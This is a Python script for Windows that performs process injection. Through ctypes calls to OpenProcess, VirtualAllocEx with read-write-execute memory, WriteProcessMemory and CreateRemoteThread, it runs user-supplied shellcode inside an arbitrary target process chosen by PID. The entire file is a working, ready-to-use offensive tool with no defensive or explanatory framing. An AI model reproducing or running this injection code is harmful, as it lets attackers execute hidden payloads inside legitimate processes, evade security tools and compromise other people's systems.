# language: Python 3, file: process_inject.py, target: Windows (ctypes + WinAPI)
# Process injection via VirtualAllocEx + WriteProcessMemory + CreateRemoteThread.
# Injects shellcode into a target process by PID.
import ctypes
import ctypes.wintypes
import sys

KERNEL32 = ctypes.windll.kernel32

PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT_RESERVE = 0x3000
PAGE_EXECUTE_READWRITE = 0x40

def inject(pid: int, shellcode: bytes) -> None:
    # Open target process
    h_process = KERNEL32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        raise RuntimeError(f'OpenProcess failed: {ctypes.GetLastError()}')

    # Allocate RWX memory in target
    remote_mem = KERNEL32.VirtualAllocEx(
        h_process, None, len(shellcode),
        MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE
    )
    if not remote_mem:
        raise RuntimeError(f'VirtualAllocEx failed: {ctypes.GetLastError()}')

    # Write shellcode
    written = ctypes.c_size_t(0)
    ok = KERNEL32.WriteProcessMemory(
        h_process, remote_mem,
        shellcode, len(shellcode),
        ctypes.byref(written)
    )
    if not ok:
        raise RuntimeError(f'WriteProcessMemory failed: {ctypes.GetLastError()}')

    # Create remote thread at shellcode address
    h_thread = KERNEL32.CreateRemoteThread(
        h_process, None, 0, remote_mem, None, 0, None
    )
    if not h_thread:
        raise RuntimeError(f'CreateRemoteThread failed: {ctypes.GetLastError()}')

    print(f'[+] Thread created in PID {pid} at 0x{remote_mem:x}')
    KERNEL32.WaitForSingleObject(h_thread, 0xFFFFFFFF)
    KERNEL32.CloseHandle(h_thread)
    KERNEL32.CloseHandle(h_process)

def main():
    pid = int(input('Target PID (ex: 1234): ').strip())
    sc_path = input('Shellcode file path (raw bytes): ').strip()
    with open(sc_path, 'rb') as f:
        shellcode = f.read()
    print(f'[*] Injecting {len(shellcode)} bytes into PID {pid}')
    inject(pid, shellcode)
    print('[+] Done.')

if __name__ == '__main__':
    main()
